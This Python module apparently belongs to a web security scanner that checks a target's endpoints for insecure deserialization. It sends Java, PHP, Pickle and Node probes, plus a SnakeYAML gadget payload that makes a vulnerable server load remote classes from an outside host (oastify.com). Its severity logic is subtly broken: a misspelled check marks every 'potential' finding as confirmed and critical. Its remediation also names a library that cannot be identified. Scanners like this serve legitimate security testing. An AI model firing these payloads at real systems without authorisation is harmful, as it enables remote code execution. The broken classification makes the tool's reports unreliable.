"""Insecure deserialization scanner -- Java, PHP, Python Pickle, Node.js.

Detects deserialization endpoints by probing common content types and
serialization format signatures. Reports potential deserialization
vulnerabilities based on response behavior.
"""
from __future__ import annotations
import asyncio
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

DESERIALIZATION_PROBES = [
    {
        "name": "java_serialization",
        "content_type": "application/x-java-serialized-object",
        "payload": b"\xac\xed\x00\x05\x73\x72\x00\x12java.lang.String",
    },
    {
        "name": "php_serialization",
        "content_type": "application/x-www-form-urlencoded",
        "payload": b"data=O:8:\"stdClass\":0:{}",
    },
    {
        "name": "python_pickle",
        "content_type": "application/python-pickle",
        "payload": b"\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x08test\x94.",
    },
    {
        "name": "yaml_deserialization",
        "content_type": "application/x-yaml",
        "payload": b"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://oastify.com/\"]]]]",
    },
    {
        "name": "node_serialization",
        "content_type": "application/json",
        "payload": b'{"__proto__": {"polluted": true}, "constructor": {"prototype": {"polluted": true}}}',
    },
]

DESERIALIZATION_SIGNATURES = [
    "java.lang.Runtime",
    "java.lang.ProcessBuilder",
    "O:8:\"stdClass\"",
    "python_pickle",
    "!!javax.script",
    "ScriptEngineManager",
]

PROBE_ENDPOINTS = [
    "/api/deserialize",
    "/api/v1/deserialize",
    "/rpc",
    "/api/rpc",
    "/api/v1/rpc",
    "/api/data",
    "/api/v1/data",
    "/api/execute",
    "/api/v1/execute",
    "/gateway",
    "/api/gateway",
    "/api/v1/gateway",
]


async def _probe_deserialization(
    url: str,
    client: TalismanHTTPClient,
) -> list[dict[str, Any]]:
    findings = []
    for endpoint in PROBE_ENDPOINTS:
        test_url = url.rstrip("/") + endpoint
        for probe in DESERIALIZATION_PROBES:
            try:
                r = await client.post(
                    test_url,
                    content=probe["payload"],
                    headers={"Content-Type": probe["content_type"]},
                    timeout=10,
                )
                resp_text = r.text
                for sig in DESERIALIZATION_SIGNATURES:
                    if sig in resp_text:
                        findings.append({
                            "issue": f"deserialization_{probe['name']}",
                            "endpoint": test_url,
                            "probe_type": probe["name"],
                            "signature_matched": sig,
                            "status": r.status_code,
                            "evidence": resp_text[:200],
                        })
                        break
                if r.status_code in (500, 502) and len(resp_text) > 0:
                    findings.append({
                        "issue": f"potential_deserialization_{probe['name']}",
                        "endpoint": test_url,
                        "probe_type": probe["name"],
                        "status": r.status_code,
                        "evidence": resp_text[:300],
                    })
            except Exception:
                pass
    return findings


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    console.print(f"\n[module][+] Insecure Deserialization Scanner[/module] -> [target]{url}[/target]")
    findings: list[dict[str, Any]] = []

    async with TalismanHTTPClient(proxy=proxy, timeout=12) as client:
        results = await _probe_deserialization(url, client)
        for r in results:
            is_confirmed = "deserialization_" in r["issue"] and "_potential" not in r["issue"]
            severity = "critical" if is_confirmed else "high"
            confidence = "confirmed" if is_confirmed else "likely"
            title = (
                f"Insecure deserialization -- {r['probe_type']} at {r['endpoint']}"
                if is_confirmed
                else f"Potential deserialization -- {r['probe_type']} at {r['endpoint']} (HTTP {r['status']})"
            )
            print_finding(title, severity, url)
            findings.append(r)
            if session:
                await session.add_finding(
                    target=url, module="deserialization",
                    vuln_type="insecure_deserialization",
                    severity=severity, confidence=confidence,
                    title=title,
                    description=(
                        f"Deserialization probe ({r['probe_type']}) sent to {r['endpoint']} "
                        f"resulted in HTTP {r['status']}. "
                        f"{'Serialization format signature reflected in response.' if is_confirmed else 'Server error indicates unsafe deserialization.'}"
                    ),
                    request=f"POST {r['endpoint']} Content-Type: {r.get('probe_type', 'unknown')}",
                    evidence=r.get("evidence", ""),
                    reproduction=f"Send serialized payload to {r['endpoint']}",
                    remediation=(
                        "1. Use safe serialization formats (JSON, protobuf) instead of native serialization.\n"
                        "2. Implement allowlist-based deserialization with validated class names.\n"
                        "3. Use HTPL library or similar for Java serialization filtering.\n"
                        "4. For Python: never use pickle.load() on untrusted data.\n"
                        "5. For PHP: use json_encode/decode instead of serialize/unserialize."
                    ),
                    cvss_score=9.8 if is_confirmed else 7.5,
                    cwe="CWE-502",
                )

    console.print(f"  Deserialization scanning complete -- {len(findings)} issues")
    return {"target": url, "findings": findings, "count": len(findings)}
